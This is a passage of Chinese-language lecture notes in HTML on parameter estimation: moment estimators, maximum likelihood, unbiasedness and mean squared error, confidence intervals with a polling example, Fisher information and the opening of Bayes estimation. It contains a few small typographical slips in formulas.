需建立可操作的检验标准: $X\ge l$, $\mu$ 未知, 求 $l$ (假设检验)</li></ul></li></ul></li></ul><h2 id="矩估计"><a href="#矩估计" class="headerlink" title="矩估计"></a>矩估计</h2><ul><li><p><strong>定义(样本矩)</strong>  $X_1,\cdots,X_n$ 独立同分布, 定义其 $k$ 阶<strong>原点矩</strong>:</p><script type="math/tex; mode=display">  a_k=\dfrac{1}{n}\sum_{i=1}^{n}X_i^k\stackrel{\textbf{LLN}}{\longrightarrow}E(X^k).</script><p>  其 $k$ 阶<strong>中心矩</strong>:</p><script type="math/tex; mode=display">  m_k=\dfrac{1}{n}\sum_{i=1}^{n}(X_i-\overline{X})^k\stackrel{\textbf{LLN}}{\longrightarrow}E\Big[(X-\mu)^k\Big].</script></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$. 考虑其均值、方差对应的样本矩.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">  \mu=E(X)\approx\overline{X}=a_1;\\  \sigma^2=E\Big[(X-\mu)^2\Big]\approx\dfrac{1}{n}\sum_{i=1}^{n}(X_i-\overline{X})^2=m_2.</script></li><li><p><strong>例</strong>  $X\sim Exp(\lambda)$. 考虑其均值、方差对应的样本矩, 并给出 $\lambda$ 的矩估计.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">  \dfrac{1}{\lambda}=E(X)\approx\overline{X}=a_1\Rightarrow\lambda=\dfrac{1}{a_1};\\  \dfrac{1}{\lambda^2}=E\Big[(X-E(X))^2\Big]\approx\dfrac{1}{n}\sum_{i=1}^{n}(X_i-\overline{X})^2=m_2\Rightarrow\lambda=\Big(\dfrac{1}{m_2}\Big)^{\tfrac{1}{2}}.</script><p>  我们通常使用<strong>低阶矩</strong>进行估计.</p></li></ul><h2 id="极大似然估计-MLE"><a href="#极大似然估计-MLE" class="headerlink" title="极大似然估计 (MLE)"></a>极大似然估计 (MLE)</h2><ul><li><p><strong>定义(似然函数)</strong>  假设 $X_1,\cdots,X_n$ 的联合分布 $f(x_1,\cdots,x_n;\theta)$ (<strong>PMF\\PDF</strong>), 其中 $\theta$ 为参数. 对于观测 $(X_1,\cdots,X_n)$ 的似然函数为</p><script type="math/tex; mode=display">  L(\theta):=f(X_1,\cdots,X_n;\theta).</script></li><li><p><strong>注</strong></p><ul><li><p>具体观测数据通常记为 $(x_1,\cdots,x_n)$, 视为 $(X_1,\cdots,X_n)$ 的具体的实现值;</p></li><li><p>离散情形下, $L(\theta)$ 为出现 $(X_1,\cdots,X_n)$ 的概率;</p></li><li><p>若 $X_1,\cdots,X_n$ 独立同分布, 总体分布为 $f_1(x;\theta)$ (<strong>PMF\\PDF</strong>), 那么</p><script type="math/tex; mode=display">  L(\theta)=f_1(X_1;\theta)f_1(X_2;\theta)\cdots f_1(X_n;\theta).</script></li></ul></li><li><p><strong>例</strong>  $X_i\sim N(\mu,\sigma^2)$ 独立同分布, 其中 $\mu$,$\sigma^2$ 未知. 考虑观测的似然函数.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">  L(\mu,\sigma^2)=\prod_{i=1}^{n}\Big(\dfrac{1}{\sqrt{2\pi}\sigma}e^{-\tfrac{(X_i-\mu)^2}{2\sigma^2}}\Big).</script></li><li><p><strong>定义(MLE)</strong>  定义 $\theta$ 的 <strong>MLE</strong> 为</p><script type="math/tex; mode=display">  \theta^{*}=\arg\max_{\theta}L(\theta).</script><p>  其中 $\theta^{<em>}=\theta^{</em>}(X_1,\cdots,X_n)$.</p></li><li><p><strong>解答续</strong>  考虑方程组</p><script type="math/tex; mode=display">  \begin{cases}  \dfrac{\partial\log L(\mu,\sigma^2)}{\partial\mu}=0;\\  \dfrac{\partial\log L(\mu,\sigma^2)}{\partial\sigma^2}=0.  \end{cases}</script><p>  解得</p><script type="math/tex; mode=display">  \begin{cases}  \mu^{*}=\overline{X},\\  (\sigma^2)^{*}=\sum\limits_{i=1}^{n}(X_i-\overline{X})^2.  \end{cases}</script><p>  经验证 $(\mu^{<em>},(\sigma^2)^{</em>})$ 为 $(\mu,\sigma^2)$ 的 <strong>MLE</strong>.</p></li><li><p><strong>注</strong>  $(\sigma^2)^{<em>}=(\sigma^{</em>})^2$ (<strong>MLE</strong> 的不变性).</p></li><li><p><strong>例</strong>  随机变量 $X_i\sim U(0,\theta)$ 独立同分布, $\theta$ 未知. 求 $\theta$ 的 <strong>MLE</strong>.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">  L(\theta)=  \begin{cases}  \cfrac{1}{\theta^n}, &X_i\in(0,\theta), \theta\ge\max\{X_1,\cdots,X_n\}\\  0, &其他.  \end{cases}</script><p>  我们得到</p><script type="math/tex; mode=display">  \theta^{*}=\max\{X_1,\cdots,X_n\}.</script></li><li><p><strong>例</strong>  总体 <strong>PDF</strong> 为 $f(x;\theta)=\dfrac{1}{\pi(1+(x-\theta)^2)}$, $x\in\mathbb{R}$ (<strong>Cauchy</strong> 分布).</p></li><li><p><strong>解答</strong></p><ul><li>无矩 $\Rightarrow$ 无矩估计;</li><li>似然方程 $\sum\limits_{i=1}^{n}\dfrac{X_i-\theta}{1+(X_i-\theta)^2}=0$, 不易求解;</li><li>合理估计, $\hat{\theta}$ 为样本中位数.</li></ul></li></ul><h2 id="优良性准则"><a href="#优良性准则" class="headerlink" title="优良性准则"></a>优良性准则</h2><ul><li><p><strong>定义(无偏性)</strong>  定义 $\hat{\theta}=\hat{\theta}(X_1,\cdots,X_n)$ 为 $\theta$ 的估计量 (随机变量). 我们称一个估计 $\hat\theta$ 的偏差 (<strong>Bias</strong>):</p><script type="math/tex; mode=display">E_{\theta}(\hat\theta-\theta)=E_{\theta}(\hat\theta)-\theta.</script><p>若 $E_{\theta}(\hat\theta-\theta)=0$, $\forall\,\theta$, 则称 $\hat\theta$ 为 $\theta$ 的一个无偏估计量.</p></li><li><p><strong>注</strong></p><ul><li>一般地, $E_{\theta}(\hat g(X_1,\cdots,X_n)-g(\theta))=0$, $\forall\,\theta\,\Leftrightarrow$ $\hat{g}$ 为 $g(\theta)$ 的无偏估计;</li><li>无偏 $\Leftrightarrow$ 无系统偏差;</li><li>$\dfrac{1}{N}\sum\limits_{m=1}^{N}\hat{\theta}(X_1^{(m)},\cdots,X_n^{(m)})\stackrel{a.s.}{\longrightarrow}E(\hat\theta)\stackrel{无偏}{=}\theta$;</li><li>无偏性的重要性视情形而定.</li></ul></li><li><p><strong>例</strong>  $E(X)=\mu$, $Var(X)=\sigma^2$.</p></li><li><p><strong>解答</strong></p><ul><li>$E(\overline{X})=\mu\Rightarrow \overline{X}$ 为 $\mu$ 的无偏估计;</li><li>$E(m_2)=E\Big(\dfrac{1}{n}\sum\limits_{i=1}^{n}(X_i-\overline{X})^2\Big)=\dfrac{n-1}{n}\sigma^2$;</li><li>$E(S^2)=E\Big(\dfrac{1}{n-1}\sum\limits_{i=1}^{n}(X_i-\overline{X})^2\Big)=\sigma^2$.</li></ul></li><li><p><strong>例</strong>  $X_i\stackrel{iid}{\sim}U(0,\theta)$.</p></li><li><p><strong>解答</strong></p><ul><li>矩估计 $\hat\theta=2\overline{X}$;</li><li><strong>MLE</strong> $\theta^{*}=\max\{X_1,\cdots, X_n\}$;</li><li>计算可得 $E(\hat\theta)=\theta,\,E(\theta^{*})=\dfrac{n}{n+1}\theta$.</li></ul></li><li><p><strong>注</strong>  <strong>MLE</strong> 可也能是有偏的 (本例中即为系统偏小).</p></li><li><p><strong>定义(均方误差准则)</strong>  定义一个估计 $\hat\theta$ 的均方误差 (<strong>MSE</strong>):</p><script type="math/tex; mode=display">  E_{\theta}\Big[(\hat\theta-\theta)^2\Big]=Var(\hat\theta)+E_{\theta}^2(\hat\theta-\theta).</script><p>  其中 $Var(\hat\theta)$ 代表着精确度, $E_{\theta}^2(\hat\theta-\theta)$ 代表着准确度.</p></li><li><p><strong>定义</strong>  假定 $\hat\theta_1$, $\hat\theta_2$ 均为 $\theta$ 的无偏估计, 若</p><script type="math/tex; mode=display">  \forall\,\theta,\,Var(\hat\theta_1)\le Var(\hat\theta_2)</script><p>  且</p><script type="math/tex; mode=display">  \exists\,\theta_0,\,Var_{\theta_0}(\hat\theta_2)<Var_{\theta_0}(\hat\theta_1).</script><p>  则称在均方误差意义下 $\hat\theta_1$ 优于 $\hat\theta_2$.</p></li><li><p><strong>例</strong>  $E(X)=\mu$.</p></li><li><p><strong>解答</strong>  </p><script type="math/tex; mode=display">  E(\overline{X})=E(X_1)=E\Big(\dfrac{1}{2}X_1+\dfrac{1}{2}X_2\Big)=\mu.</script><script type="math/tex; mode=display">  Var(\overline{X})=\dfrac{1}{n}\sigma^2,\,Var(X_1)=\sigma^2,\,Var\Big(\dfrac{1}{2}X_1+\dfrac{1}{2}X_2\Big)=\dfrac{1}{2}\sigma^2.</script></li><li><p><strong>注</strong>  有时也可称为“有效性准则”.</p></li><li><p><strong>定义</strong>  假定 $\hat\theta_0$ 为 $\theta$ 的无偏估计, 若对任意 $\theta$ 与 $\theta$ 的无偏估计 $\hat\theta$</p><script type="math/tex; mode=display">  Var(\hat\theta_0)\le Var(\hat\theta)</script><p>  则称 $\hat\theta_0$ 为最小方差无偏估计 (<strong>MVUE</strong>).</p></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$.</p></li><li><p><strong>解答</strong>  由于</p><script type="math/tex; mode=display">E(m_2)=\dfrac{n-1}{n}\sigma^2,\,E(S^2)=\sigma^2.</script><p>因此计算可得</p><script type="math/tex; mode=display">E\Big[(m_2-\sigma^2)^2\Big]=\cdots<E\Big[(S^2-\sigma^2)^2\Big]=\cdots</script><p>这是用低偏差换了方差.</p></li><li><p><strong>定义</strong></p><ul><li>$\hat\theta=\hat\theta(X_1,\cdots,X_n)$ 的分布称为抽样分布;</li><li>$\hat\theta=\hat\theta(X_1,\cdots,X_n)$ 的标准差称为标准误差, 记为 $se(\hat\theta)$.</li></ul></li><li><p><strong>定义(大样本性质)</strong>  估计量 $\hat\theta$ 当 $n\rightarrow\theta$ 时的性质.</p></li><li><p><strong>定义(渐进无偏性)</strong>  有 $\lim\limits_{n\rightarrow\infty} E(\hat\theta-\theta)=0$;</p></li><li><p><strong>定义(相合性)</strong>  若 $\forall\,\varepsilon&gt;0$, 有 $\lim\limits_{n\rightarrow\infty}P(\left|\hat\theta-\theta\right|\ge\varepsilon)=0$, 则称 $\hat\theta$ 为 $\theta$ 的一个相合估计, 即 $\hat\theta\stackrel{P}{\longrightarrow}\theta$.</p><ul><li><strong>WLLN</strong> $\Rightarrow$ $\overline{X}$ 是 $\mu$ 的一个相合估计;</li><li>相合性是良好点估计的自然要求.</li></ul></li><li><p><strong>例</strong>  我们得到</p><script type="math/tex; mode=display">  \begin{aligned}  m_2&=\dfrac{1}{n}\sum\limits_{i=1}^{n}(X_i-\overline{X})^2\\  &=\dfrac{1}{n}\sum\limits_{i=1}^{n}(X_i-\mu-\overline{X}+\mu)^2\\  &=\dfrac{1}{n}\sum\limits_{i=1}^{n}(X_i-\mu)^2-(\overline{X}-\mu)^2\\  &\stackrel{P}{\rightarrow}E\Big[(X-\mu)^2\Big]\\  &=\sigma^2.  \end{aligned}</script><p>  进而有</p><script type="math/tex; mode=display">  S^2=\dfrac{n}{n-1}m_2\stackrel{P}{\rightarrow}\sigma^2.</script></li><li><p><strong>定义(渐进正态性)</strong>  $\dfrac{\hat\theta-\theta}{se(\hat\theta)}\stackrel{d}{\rightarrow}Z\sim(0,1)$ (渐进正态估计).</p><ul><li><p>$\hat\theta\stackrel{近似}{\sim}N(0,se^2(\hat\theta))$;</p></li><li><p><strong>CLT</strong> $\Rightarrow\overline{X}$ 为 $\mu$ 的一个渐进正态估计, $se(\overline{X})=\dfrac{\sigma}{\sqrt{n}}$.</p></li></ul></li></ul><h2 id="置信区间-Condifence-Interval"><a href="#置信区间-Condifence-Interval" class="headerlink" title="置信区间 (Condifence Interval)"></a>置信区间 (Condifence Interval)</h2><ul><li><p><strong>定义(置信区间)</strong>  $\forall\,\alpha\in(0,1)$, $\forall\,\theta$, 有 $\hat\theta_i=\hat\theta_i(X_1,\cdots,X_n)$, 其中 $i=1,2$, 使得</p><script type="math/tex; mode=display">  P(\hat\theta_1<\theta<\hat\theta_2)\ge 1-\alpha.</script><p>  则称 $(\hat\theta_1,\hat\theta_2)$ 为 $\theta$ 的 $(1-\alpha)$ 置信的区间估计 (双侧).</p></li><li><p><strong>注</strong></p><ul><li>$\alpha$ 通常取为 $0.05$, $0.01$, $0.1$;</li><li>置信 (水平、系数、度) 是针对方法的;</li><li>可靠性优先原则 (先保证 $P(\hat\theta_1&lt;\theta&lt;\hat\theta_2)\ge 1-\alpha$), 再尽量提升精度 (通常用 $E(\hat\theta_2-\hat\theta_1)$ 刻画).</li></ul></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$, <strong>已知</strong> $\sigma^2$, 给出 $\mu$ 的 $(1-\alpha)$ 置信区间估计.</p></li><li><p><strong>解答</strong>  注意到</p><script type="math/tex; mode=display">  \begin{aligned}  &\overline{X}-\mu\sim N(0,\dfrac{\sigma^2}{n})\\  \Longleftrightarrow&\dfrac{\overline{X}-\mu}{\frac{\sigma}{\sqrt{n}}}\sim N(0,1)\\  \Longrightarrow&P\Big(\left|\dfrac{\overline{X}-\mu}{\frac{\sigma}{\sqrt{n}}}\right|<Z_{\tfrac{\alpha}{2}}\Big)=1-\alpha.  \end{aligned}</script><p>  其中 $Z_{\tfrac{\alpha}{2}}$ 为 $N(0,1)$ 的上侧 $\dfrac{\alpha}{2}$ 分位数. 因此所求 $(1-\alpha)$ 置信的区间估计为</p><script type="math/tex; mode=display">  (\overline{X}-\frac{\sigma}{\sqrt{n}}Z_{\tfrac{\alpha}{2}},\overline{X}+\frac{\sigma}{\sqrt{n}}Z_{\tfrac{\alpha}{2}}).</script></li><li><p><strong>注</strong></p><ul><li>若 $\alpha=0.05$, 则 $Z_{\tfrac{\alpha}{2}}=Z_{0.025}\approx 1.96\approx 2$;</li><li>若用 $\overline{X}$ 估计 $\mu$, 则有 $(1-\alpha)$ 置信, 误差绝对值 $\vert\overline{X}-\mu\vert\le\frac{\sigma}{\sqrt{n}}Z_{\tfrac{\alpha}{2}}$;</li><li>给定 $\varepsilon&gt;0$, 则 $n\ge\Big(\dfrac{Z_{\frac{\alpha}{2}}\sigma}{\varepsilon}\Big)^2$ 时, 有 $(1-\alpha)$ 置信, 误差绝对值 $\le\varepsilon$.</li></ul></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$, <strong>未知</strong> $\sigma^2$, 给出 $\mu$ 的 $(1-\alpha)$ 置信区间估计.</p></li><li><p><strong>解答</strong>  注意到</p><script type="math/tex; mode=display">  \dfrac{\overline{X}-\mu}{\frac{\sigma}{\sqrt{n}}}\sim N(0,1),\\  \dfrac{(n-1)S^2}{\sigma^2}\sim\chi^2(n-1).</script><p>  注意到 $\overline{X}$, $S^2$ 相互独立, 由<strong>陈书 $P_{93-94}$</strong>可得</p><script type="math/tex; mode=display">  \dfrac{\overline{X}-\mu}{\frac{\sigma}{\sqrt{n}}}/\dfrac{S}{\sigma}\sim t(n-1).</script><p>  即</p><script type="math/tex; mode=display">  \dfrac{\overline{X}-\mu}{\frac{S}{\sqrt{n}}}\sim t(n-1).</script><p>  因此</p><script type="math/tex; mode=display">  P\Big(\left|\dfrac{\overline{X}-\mu}{\frac{S}{\sqrt{n}}}\right|<t_{\tfrac{\alpha}{2}}(n-1)\Big)=1-\alpha.</script><p>  其中 $t_{\tfrac{\alpha}{2}}(n-1)$ 为 $t(n-1)$ 分布上侧 $\dfrac{\alpha}{2}$ 分位数, 所求 $(1-\alpha)$ 置信区间估计为</p><script type="math/tex; mode=display">  (\overline{X}-\frac{S}{\sqrt{n}}t_{\tfrac{\alpha}{2}}(n-1),\overline{X}+\frac{S}{\sqrt{n}}t_{\tfrac{\alpha}{2}}(n-1)).</script></li><li><p><strong>注</strong>  $\dfrac{\overline{X}-\mu}{\frac{\sigma}{\sqrt{n}}}$, $\dfrac{\overline{X}-\mu}{\frac{S}{\sqrt{n}}}$ 成为枢轴变量.</p></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$, <strong>未知</strong> $\mu$, 给出 $\sigma^2$ 的 $(1-\alpha)$ 置信区间估计.</p></li><li><p><strong>解答</strong>  注意到</p><script type="math/tex; mode=display">  \dfrac{(n-1)S^2}{\sigma^2}\sim\chi^2(n-1).</script><p>  因此所求 $(1-\alpha)$ 置信区间估计为</p><script type="math/tex; mode=display">  \Big(\frac{(n-1)S^2}{\chi^2_{\tfrac{\alpha}{2}}(n-1)},\frac{(n-1)S^2}{\chi^2_{1-\tfrac{\alpha}{2}}(n-1)}\Big).</script></li><li><p><strong>注</strong>  我们有</p><script type="math/tex; mode=display">  \begin{aligned}  \dfrac{(n-1)S^2}{\sigma^2}&=\dfrac{\sum_{i=1}^{n}(X_i-\overline{X})^2}{\sigma^2}\\  &=\sum\limits_{i=1}^{n}\Big(\dfrac{X_i-\mu}{\sigma}\Big)^2-\Big(\dfrac{\overline{X}-\mu}{\tfrac{\sigma}{\sqrt{n}}}\Big)^2\\  &\sim\chi^2(n-1).  \end{aligned}</script></li><li><p><strong>例</strong>  $X\sim N(\mu_1,\sigma^2)$, $Y\sim N(\mu_2,\sigma^2)$ 相互独立, <strong>未知</strong> $\mu_1$, $\mu_2$, $\sigma^2$, 给出 $\mu_1-\mu_2$ 的 $(1-\alpha)$ 置信区间估计.</p></li><li><p><strong>解答</strong>  设 $X_1,\cdots,X_n$, $Y_1,\cdots,Y_m$ 为随机样本, $S_1^2$ 为 $X$ 的样本方差, $S_2^2$ 为 $Y$ 的样本方差, 则</p><script type="math/tex; mode=display">  (\overline{X}-\overline{Y})-(\mu_1-\mu_2)\sim N(0,\dfrac{\sigma^2}{n}+\dfrac{\sigma^2}{m}).</script><p>  因为</p><script type="math/tex; mode=display">  \dfrac{(n-1)S_1^2}{\sigma^2}+\dfrac{(m-1)S_2^2}{\sigma^2}\sim\chi^2(n+m-2).</script><p>  记</p><script type="math/tex; mode=display">  S^2=\dfrac{n-1}{n+m-2}S_1^2+\dfrac{m-1}{n+m-2}S_2^2.</script><p>  从而得到</p><script type="math/tex; mode=display">  \dfrac{(\overline{X}-\overline{Y})-(\mu_1-\mu_2)}{\sqrt{\dfrac{\sigma^2}{n}+\dfrac{\sigma^2}{m}}}/\dfrac{S}{\sigma}\sim t(n+m-2).</script><p>  也即</p><script type="math/tex; mode=display">  \dfrac{(\overline{X}-\overline{Y})-(\mu_1-\mu_2)}{S\sqrt{\dfrac{1}{n}+\dfrac{1}{m}}}\sim t(n+m-2).</script><p>  这是我们用到的枢轴变量, 所求 $(1-\alpha)$ 置信区间估计为</p><script type="math/tex; mode=display">  \Big(\overline{X}-\overline{Y}-t_{\tfrac{\alpha}{2}}(l)S\sqrt{\dfrac{m+n}{mn}},\overline{X}-\overline{Y}+t_{\tfrac{\alpha}{2}}(l)S\sqrt{\dfrac{m+n}{mn}}\Big).</script><p>  其中 $l=n+m-2$.</p></li><li><p><strong>定义(渐进置信区间)</strong>  通过大样本方法进行区间估计.</p></li><li><p><strong>例(选举问题)</strong>  真实支持率 $p$ 未知, $n=1200$, 观测比例 $\dfrac{684}{1200}\approx 0.57$. 给出 $p$ 的一个 $95\%$ 置信的区间估计.</p></li><li><p><strong>解答</strong>  $X_i\sim B(p)\,(1\le i\le n)$ <strong>iid</strong> (近似有放回, $n&lt;&lt;N$). 我们有</p><script type="math/tex; mode=display">  P_n=P_n(X_1,\cdots,X_n)=\dfrac{1}{n}\sum\limits_{i=1}^{n}X_i=\overline{X}.</script><p>  因此</p><script type="math/tex; mode=display">  E(P_n)=p,\,Var(P_n)=\dfrac{p(1-p)}{n}.</script><p>  由 <strong>CLT</strong>, 得到</p><script type="math/tex; mode=display">  \dfrac{P_n-p}{\sqrt{\tfrac{p(1-p)}{n}}}\sim N(0,1)\Rightarrow P\Big(|\dfrac{P_n-p}{\sqrt{\tfrac{p(1-p)}{n}}}|<Z_{\tfrac{\alpha}{2}}\Big)\approx 1-\alpha.</script><p>  $[1]$ 用 $S^2=\dfrac{1}{n-1}\sum\limits_{i=1}^{n}(X_i-\overline{X})^2$ 来估计 $\sigma^2=p(1-p)$. 由 <strong>CLT</strong>, 得到</p><script type="math/tex; mode=display">  \dfrac{P_n-p}{\sqrt{\tfrac{S^2}{n}}}\stackrel{近似} {\sim} N(0,1)\Rightarrow P\Big(|\dfrac{P_n-p}{\sqrt{\tfrac{S^2}{n}}}|<Z_{\tfrac{\alpha}{2}}\Big)\approx 1-\alpha.</script><p>  其中 $S^2\approx 0.2475$, 区间估计为 $(0.542,0.598)$.</p><p>  $[2]$ 用 $m_2=\dfrac{1}{n}\sum\limits_{i=1}^{n}(X_i-\overline{X})^2$ 来估计 $\sigma^2=p(1-p)$. </p><p>  实际上, 我们有</p><script type="math/tex; mode=display">  m_2=\dfrac{1}{n}[(1-P_n)^2nP_n+(0-P_n)^2(n-nP_n)]=P_n(1-P_n).</script><p>  由 <strong>CLT</strong>, 得到</p><script type="math/tex; mode=display">  \dfrac{P_n-p}{\sqrt{\tfrac{P_n(1-P_n)}{n}}}\stackrel{近似} {\sim} N(0,1)\Rightarrow p\in(0.542,0.598).</script><p>  $[3]$ 用 $p(1-p)$ 的最大值来估计 $\sigma^2=p(1-p)$. 由 <strong>CLT</strong>, 得到</p><script type="math/tex; mode=display">  \dfrac{P_n-p}{\sqrt{\tfrac{1}{4n}}}\stackrel{近似} {\sim} N(0,1)\Rightarrow p\in(0.542,0.599).</script></li><li><p><strong>注</strong>  近似分布情况下, 置信度 $\approx 1-\alpha$, 近似程度取决于 $n$ 及总体分布.</p></li><li><p><strong>定义(利用 MLE 构建置信区间)</strong></p><p>  总体分布 $f$ 满足一定的光滑性条件, 存在 $\sigma_n&gt;0$, 使 $\dfrac{\theta^{*}-\theta}{\sigma_n}\rightarrow N(0,1)$.</p></li><li><p><strong>定义(Fisher 信息量)</strong>  $X_1,\cdots,X_n$ <strong>iid</strong>, 其 <strong>PDF</strong> 为 $f(x;\theta)$. 定义对数似然函数</p><script type="math/tex; mode=display">  l(\theta)=\log L(\theta)=\sum_{i=1}^{n}\log f(x_i;\theta).</script><p>  定义</p><script type="math/tex; mode=display">  I_n(\theta)=E\Big[\big(\dfrac{\partial l(\theta)}{\partial\theta}\big)^2\Big]=E\Big[\big(\sum_{i=1}^{n}\dfrac{\partial\log f(X_i;\theta)}{\partial\theta}\big)^2\Big].</script><p>  注意到</p><script type="math/tex; mode=display">  \begin{aligned}  E\Big(\dfrac{\partial\log f(X_i;\theta)}{\partial\theta}\Big)&=E\Big(\dfrac{f_{\theta}(X_i;\theta)}{f(X_i;\theta)}\Big)\\  &=\int\dfrac{f_{\theta}(X_i;\theta)}{f(X_i;\theta)}f(X_i;\theta)dx\\  &=\int f_{\theta}(X_i;\theta)dx\\  &=\dfrac{d}{d\theta}\int f(X_i;\theta)dx=0.  \end{aligned}</script><p>  因此</p><script type="math/tex; mode=display">  \begin{aligned}  \end{aligned}\begin{aligned}  I_n(\theta)&=E\Big[\big(\sum_{i=1}^{n}\dfrac{\partial\log f(X_i;\theta)}{\partial\theta}\big)^2\Big]\\  &=\sum_{i=1}^{n}E\Big[\big(\dfrac{\partial\log f(X_i;\theta)}{\partial\theta}\big)^2\Big]\\  &:=nI(\theta).  \end{aligned}</script><p>  由极大似然估计的定义, 我们有</p><script type="math/tex; mode=display">  0=l'(\theta^*)\approx l'(\theta)+(\theta^*-\theta)l''(\theta)\Rightarrow\theta^*-\theta\approx \dfrac{l'(\theta)}{-l''(\theta)}\\  \Rightarrow\sqrt{n}(\theta^*-\theta)\approx \dfrac{\tfrac{1}{\sqrt{n}}l'(\theta)}{-\tfrac{1}{n}l''(\theta)}.</script><p>  研究上式<strong>分子</strong>: 设随机变量 $Y_i=\dfrac{\partial\log f(X_i;\theta)}{\partial\theta}=\dfrac{f_{\theta}(X_i;\theta)}{f(X_i;\theta)}$, 那么</p><script type="math/tex; mode=display">  E(Y_i)=0,\,Var(Y_i)=E(Y_i^2)-E^2(Y_i)=I(\theta).</script><p>  从而</p><script type="math/tex; mode=display">  \dfrac{1}{\sqrt{n}}l'(\theta)=\dfrac{1}{\sqrt{n}}\sum_{i=1}^{n}Y_i=\dfrac{\overline{Y}}{\tfrac{1}{\sqrt{n}}}\stackrel{CLT}{\longrightarrow}N(0,I(\theta)).</script><p>  研究上式<strong>分母</strong>: </p><script type="math/tex; mode=display">  -\dfrac{1}{n}l''(\theta)=-\dfrac{1}{n}\sum_{i=1}^{n}\Big[\dfrac{f_{\theta\theta}(X_i;\theta)}{f(X_i;\theta)}-\big(\dfrac{f_{\theta}(X_i;\theta)}{f(X_i;\theta)}\big)^2\Big].</script><p>  注意到</p><script type="math/tex; mode=display">  E\Big(\dfrac{f_{\theta\theta}(X_i;\theta)}{f(X_i;\theta)}\Big)=0.</script><p>  因此</p><script type="math/tex; mode=display">  -\dfrac{1}{n}l''(\theta)\stackrel{WLLN}{\longrightarrow}E\Big[\dfrac{1}{n}\sum_{i=1}^{n}\big(\dfrac{f_{\theta}(X_i;\theta)}{f(X_i;\theta)}\big)^2\Big]=\dfrac{1}{n}\sum_{i=1}^{n}E(Y_i^2)=I(\theta).</script><p>  结合上述讨论可得</p><script type="math/tex; mode=display">  \sqrt{n}(\theta^*-\theta)\rightarrow N(0,\dfrac{1}{I(\theta)})\\  \Leftrightarrow\dfrac{\theta^*-\theta}{\tfrac{1}{\sqrt{nI(\theta)}}}\stackrel{近似}{\sim}N(0,1)\\  \Rightarrow\dfrac{\theta^*-\theta}{\tfrac{1}{\sqrt{nI(\theta^*)}}}\stackrel{近似}{\sim}N(0,1).</script><p>  这说明可以取 $\sigma_n=\dfrac{1}{\sqrt{nI(\theta)}}$ 或 $\dfrac{1}{\sqrt{nI(\theta^*)}}$.</p></li><li><p><strong>例(选举问题)</strong>  真实支持率 $p$ 未知, $n=1200$, 观测比例 $\dfrac{684}{1200}\approx 0.57$. 给出 $p$ 的一个 $95\%$ 置信的区间估计.</p></li><li><p><strong>解答续</strong>  注意到 $X_i\stackrel{iid}{\sim}B(p)$, $p$ 的 <strong>MLE</strong> 为 $p^{*}=P_n$. 有似然函数</p><script type="math/tex; mode=display">  f(X;p)=p^{X}(1-p)^{1-X}\Rightarrow \dfrac{\partial\log f}{\partial p}=\dfrac{X-p}{p(1-p)}.</script><p>  <strong>Fisher</strong> 信息量为:</p><script type="math/tex; mode=display">  I(p)=E\Big[\big(\dfrac{X-p}{p(1-p)}\big)^2\Big]=\dfrac{1}{p(1-p)}.</script><p>  得到 $\sigma_n=\dfrac{1}{\sqrt{p(1-p)}}$ 或 $\dfrac{1}{\sqrt{p^{<em>}(1-p^{</em>})}}$. 这与前例 $[2]$ 完全一致.</p></li><li><p><strong>例(两总体)</strong>  $X\sim N(\mu_1,\sigma_1^2)$, $Y\sim N(\mu_2,\sigma_2^2)$ 独立, 参数未知. 估计 $\mu_1-\mu_2$.</p></li><li><p><strong>解答</strong>  得到</p><script type="math/tex; mode=display">  \dfrac{(\overline{X}-\overline{Y})-(\mu_1-\mu_2)}{\sqrt{\dfrac{\sigma_1^2}{n}+\dfrac{\sigma_2^2}{m}}}\sim N(0,1).</script><p>  因此</p><script type="math/tex; mode=display">  \dfrac{(\overline{X}-\overline{Y})-(\mu_1-\mu_2)}{\sqrt{\dfrac{S_1^2}{n}+\dfrac{S_2^2}{m}}}\stackrel{近似}{\sim} N(0,1).</script></li></ul><h2 id="Bayes-估计"><a href="#Bayes-估计" class="headerlink" title="Bayes 估计"></a>Bayes 估计</h2><ul><li><p><strong>定义(Bayes 估计)</strong></p><ul><li><p>在搜集数据之前, 对参数 $\theta$ 有先验知识, 可用一个概率分布来刻画 (先验分布).</p></li><li><p>$\Theta$ — 随机变量, $\theta$ —  $\Theta$ 的实现值.</p></li><li><p>$X$ — 试验观测, $x$ — 具体观测结果.</p></li><li><p>$f_{\Theta}(\theta)$ — 先验分布, $f_{X\mid\Theta}(x\mid\theta)=f_X(x,\theta)$ — 搜集的样本分布.</p></li><li><p>更新先验分布为后验分布:</p><script type="math/tex; mode=display">  f_{\Theta\mid X}(\theta\mid x)=\dfrac{f(x,\theta)}{f_X(x)}=\dfrac{f_{X\mid\Theta}(x\mid\theta)f_{\Theta}(\theta)}{f_X(x)}.</script><p>  其中</p><script type="math/tex; mode=display">  f_X(x)=\int_{\mathbb{R}}f(x,\theta)d\theta.</script><p>  可通过后验期望或后验众数得到 <strong>Bayes</strong> 估计值.</p></li></ul></li><li><p><strong>例</strong>  投掷硬币, 正面向上的概率为 $\theta$ (未知). 抛 $n$ 次观测到 $x$ 次正面向上.</p></li><li><p><strong>解答</strong>  对 $\theta$ 的先验认知: $\theta\sim U(0,1)$ (<strong>Bayes</strong> 法则). 此时有 $f_{\Theta}(\theta)=1$, $\theta\in(0,1)$.</p><p>  令 $X=n$ 次试验正面向上的次数, 给定 $\theta$ 时, $X\sim B(n,\theta)$. 即</p><script type="math/tex; mode=display">  f_{X\mid\Theta}(x\mid\theta)=P(X=x\mid \Theta=\theta)=C_n^x\theta^x(1-\theta)^{n-x},x=0,1,\cdots, n.</script><p>  故 $(X,\Theta)$ 的联合分布为 </p><script type="math/tex; mode=display">  f(x,\theta)=C_n^x\theta^x(1-\theta)^{n-x},\theta\in(0,1),x=0,1,\cdots, n.</script><p>  得到</p><script type="math/tex; mode=display">  f_X(x)=\int_0^1f(x,\theta)d\theta=C_n^x\int_0^1\theta^x(1-\theta)^{n-x}d\theta\\  